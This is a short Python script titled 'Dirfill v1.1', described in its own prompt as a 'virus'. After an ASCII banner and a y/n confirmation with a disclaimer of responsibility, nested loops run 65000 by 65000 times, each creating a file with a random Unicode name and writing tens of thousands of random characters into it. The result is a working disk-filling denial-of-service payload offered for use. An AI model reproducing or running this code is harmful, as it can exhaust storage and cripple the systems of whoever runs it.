import os, time, random

os.system("title Dirfill v1.1")
while True:
    os.system("color 7 & cls")
    print("""
  _____  _____  _____   ______  _____  _       _       __      __ __    __ 
 |  __ \|_   _||  __ \ |  ____||_   _|| |     | |      \ \    / //_ |  /_ |
 | |  | | | |  | |__) || |__     | |  | |     | |       \ \  / /  | |   | |
 | |  | | | |  |  _  / |  __|    | |  | |     | |        \ \/ /   | |   | |
 | |__| |_| |_ | | \ \ | |      _| |_ | |____ | |____     \  /    | | _ | |
 |_____/|_____||_|  \_\|_|     |_____||______||______|     \/     |_|(_)|_|               
    """)
    confirm = input("Are you sure you want to execute the virus? I am not responsible for any consequences (y/n)\n> ")
    if confirm.lower() == "y":
        break;
    elif confirm.lower() == "n":
        exit()
    else:
        print(f"'{confirm}' is not a valid option. Type 'y' to execute or 'n' to exit")
        time.sleep(3)
def get_random_unicode(length):
    get_char = chr
    include_ranges = [
        ( 0x00AE, 0x00FF ),
        ( 0x0100, 0x017F ),
        ( 0x0180, 0x024F ),
        ( 0x2C60, 0x2C7F ),
        ( 0x16A0, 0x16F0 ),
        ( 0x0370, 0x0377 ),
        ( 0x037A, 0x037E ),
        ( 0x0384, 0x038A ),
        ( 0x038C, 0x038C ),
    ]
    alphabet = [
        get_char(code_point) for current_range in include_ranges
            for code_point in range(current_range[0], current_range[1])
    ]
    return ''.join(random.choice(alphabet) for i in range(length))

for i in range(65000):
    for i in range(65000):
        open(f"{get_random_unicode(250)}", "x", encoding="utf-8").write(str(get_random_unicode(65000)))